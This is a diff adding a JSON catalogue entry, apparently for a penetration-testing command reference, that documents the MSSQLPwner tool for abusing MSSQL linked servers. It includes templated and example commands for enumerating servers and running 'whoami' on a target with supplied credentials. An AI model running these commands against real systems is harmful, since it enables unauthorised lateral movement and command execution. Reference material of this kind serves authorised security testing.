@@ -1,0 +1,31 @@
+{
+  "id": "mssqlpwner",
+  "name": "MSSQLPwner Linked Server Abuse",
+  "command": "mssqlpwner '<domain>/<user>:<password>'@<ip> -windows-auth enumerate",
+  "description": "Enumerate and abuse MSSQL linked servers for lateral movement",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "mssql"
+  ],
+  "tags": [
+    "mssqlpwner",
+    "mssql",
+    "linked-server",
+    "lateral-movement",
+    "enumeration"
+  ],
+  "variations": [
+    {
+      "label": "Execute Command",
+      "requires": "password",
+      "command": "mssqlpwner '<domain>/<user>:<password>'@<ip> -windows-auth exec -command 'whoami'"
+    }
+  ],
+  "examples": [
+    "mssqlpwner 'corp.local/user:password'@192.168.1.56 -windows-auth enumerate",
+    "mssqlpwner 'corp.local/user:password'@192.168.1.56 -windows-auth exec -command 'whoami'"
+  ]
+}
